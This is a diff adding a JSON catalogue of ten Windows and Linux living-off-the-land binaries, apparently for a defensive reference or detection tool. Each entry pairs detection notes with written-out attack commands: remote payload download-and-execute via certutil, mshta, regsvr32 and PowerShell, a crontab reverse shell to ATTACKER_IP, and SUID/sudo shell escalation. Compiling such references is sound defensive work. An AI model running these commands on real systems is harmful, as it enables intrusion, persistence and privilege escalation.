@@ -1,0 +1,146 @@
+[
+  {
+    "id": "certutil",
+    "name": "certutil.exe",
+    "os": "windows",
+    "category": "Download / Decode",
+    "description": "Native Windows certificate utility abusable for downloading files or decoding base64 payloads.",
+    "example_command": "certutil -urlcache -split -f http://example.com/payload.exe payload.exe",
+    "alt_commands": [
+      "certutil -decode encoded.txt decoded.exe"
+    ],
+    "detection_notes": "Alert on certutil.exe spawning with '-urlcache' or '-decode' flags, especially with outbound network connections. Sigma rule: process_creation with Image ending in certutil.exe AND CommandLine contains 'urlcache'.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Certutil/"
+    ]
+  },
+  {
+    "id": "mshta",
+    "name": "mshta.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Executes Microsoft HTML Application (.hta) files, commonly abused to run remote scripts.",
+    "example_command": "mshta http://example.com/payload.hta",
+    "alt_commands": [
+      "mshta vbscript:Close(Execute(\"GetObject(\"\"script:http://example.com/payload.sct\"\")\"))"
+    ],
+    "detection_notes": "Monitor for mshta.exe with network connections or spawning child processes like powershell.exe/cmd.exe. Rare in normal business use.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Mshta/"
+    ]
+  },
+  {
+    "id": "regsvr32",
+    "name": "regsvr32.exe",
+    "os": "windows",
+    "category": "Execution / Bypass",
+    "description": "Registers DLLs, abusable via 'Squiblydoo' technique to execute scriptlets from remote servers, bypassing application whitelisting.",
+    "example_command": "regsvr32 /s /n /u /i:http://example.com/payload.sct scrobj.dll",
+    "alt_commands": [],
+    "detection_notes": "Flag regsvr32.exe with '/i:http' in command line or network connections shortly after execution.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/"
+    ]
+  },
+  {
+    "id": "rundll32",
+    "name": "rundll32.exe",
+    "os": "windows",
+    "category": "Execution",
+    "description": "Runs functions stored in DLL files; can be abused to execute arbitrary code or JavaScript via advpack.dll/pcwutl.dll.",
+    "example_command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://example.com/payload.sct\")",
+    "alt_commands": [
+      "rundll32.exe pcwutl.dll,LaunchApplication notepad.exe"
+    ],
+    "detection_notes": "Baseline normal rundll32 usage per environment; alert on unusual DLL exports (LaunchApplication, RunHTMLApplication) or network activity.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Rundll32/"
+    ]
+  },
+  {
+    "id": "wmic",
+    "name": "wmic.exe",
+    "os": "windows",
+    "category": "Execution / Lateral Movement",
+    "description": "Windows Management Instrumentation command tool, abusable for remote process creation and payload execution.",
+    "example_command": "wmic /node:TARGET process call create \"cmd.exe /c calc.exe\"",
+    "alt_commands": [
+      "wmic os get /format:\"http://example.com/payload.xsl\""
+    ],
+    "detection_notes": "Monitor wmic.exe usage with 'process call create', especially targeting remote nodes, and 'format:' XSL abuse.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Wmic/"
+    ]
+  },
+  {
+    "id": "bash",
+    "name": "bash",
+    "os": "linux",
+    "category": "Shell / Privilege Escalation",
+    "description": "If bash has SUID bit set or is allowed via sudo without restriction, can be used to escalate privileges or spawn shells.",
+    "example_command": "sudo bash -p",
+    "alt_commands": [
+      "bash -p (if SUID bit set)"
+    ],
+    "detection_notes": "Audit SUID binaries regularly (find / -perm -4000). Alert on sudoers entries allowing bash without command restriction.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/bash/"
+    ]
+  },
+  {
+    "id": "find",
+    "name": "find",
+    "os": "linux",
+    "category": "Privilege Escalation",
+    "description": "The find command's -exec flag can spawn a shell, commonly abused when find has SUID or elevated sudo rights.",
+    "example_command": "find . -exec /bin/sh -p \\; -quit",
+    "alt_commands": [
+      "sudo find . -exec /bin/sh \\; -quit"
+    ],
+    "detection_notes": "Flag find executions with -exec spawning shell binaries, especially under sudo/SUID context.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/find/"
+    ]
+  },
+  {
+    "id": "cron",
+    "name": "crontab",
+    "os": "linux",
+    "category": "Persistence",
+    "description": "Scheduled task abuse for persistence; if writable by low-priv user or root cron references world-writable scripts, can lead to privilege escalation.",
+    "example_command": "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"' | crontab -",
+    "alt_commands": [],
+    "detection_notes": "Monitor changes to crontabs, especially reverse shell patterns (/dev/tcp) or unexpected new entries.",
+    "references": [
+      "https://gtfobins.github.io/gtfobins/crontab/"
+    ]
+  },
+  {
+    "id": "powershell",
+    "name": "powershell.exe",
+    "os": "windows",
+    "category": "Execution / Download",
+    "description": "Native scripting engine abusable for downloading and executing payloads in-memory, evading disk-based AV.",
+    "example_command": "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://example.com/payload.ps1')\"",
+    "alt_commands": [
+      "powershell -enc <base64EncodedCommand>"
+    ],
+    "detection_notes": "Alert on encoded commands (-enc/-EncodedCommand), DownloadString/DownloadFile usage, and hidden window styles combined with network activity.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Powershell/"
+    ]
+  },
+  {
+    "id": "msbuild",
+    "name": "msbuild.exe",
+    "os": "windows",
+    "category": "Execution / Bypass",
+    "description": "Legitimate build tool abusable to compile and execute inline C# tasks, bypassing application whitelisting.",
+    "example_command": "msbuild payload.csproj",
+    "alt_commands": [],
+    "detection_notes": "Rare in standard environments outside dev machines/CI. Flag msbuild.exe executions with inline task XML containing suspicious code or network calls.",
+    "references": [
+      "https://lolbas-project.github.io/lolbas/Binaries/Msbuild/"
+    ]
+  }
+]
